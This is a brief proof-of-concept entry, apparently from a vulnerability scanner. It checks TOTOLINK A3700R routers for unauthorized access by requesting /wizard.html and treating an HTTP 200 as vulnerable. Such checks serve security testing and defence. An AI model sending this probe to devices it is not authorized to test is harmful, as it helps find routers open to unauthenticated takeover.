{
        'name': 'TOTOLINK-A3700R未授权访问漏洞',
        'poc': [{'requests':{
            'method': 'get',
            'payload': '/wizard.html',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0)Gecko/20100101 Firefox/125.0',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': False
        }}
        ]
    }